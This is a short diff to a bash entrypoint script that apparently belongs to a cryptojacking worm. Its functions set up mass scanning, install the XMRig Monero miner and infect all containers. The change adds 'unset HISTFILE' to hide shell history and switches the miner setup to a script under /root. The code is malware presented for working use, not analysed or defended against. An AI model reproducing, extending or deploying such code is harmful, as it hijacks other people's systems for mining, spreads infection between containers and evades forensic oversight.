@@ -1,9 +1,8 @@
 #!/bin/bash
-#
-#   File:     entrypoint.sh
-#   Path      /usr/local/bin/entrypoint.sh
-#
-# Variables
+unset HISTFILE
+export LC_ALL=C
+export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
+
 RATESCAN="50000"
 SETUP_SLEEP="1"
 
@@ -97,7 +96,7 @@ function SETUP_MSCAN(){
 }
 
 function SETUP_XMR(){
-/usr/local/bin/setup_xmrig.sh
+bash /root/setup_xmrig.sh
 }
 
 function INFECT_ALL_CONTAINERS(){
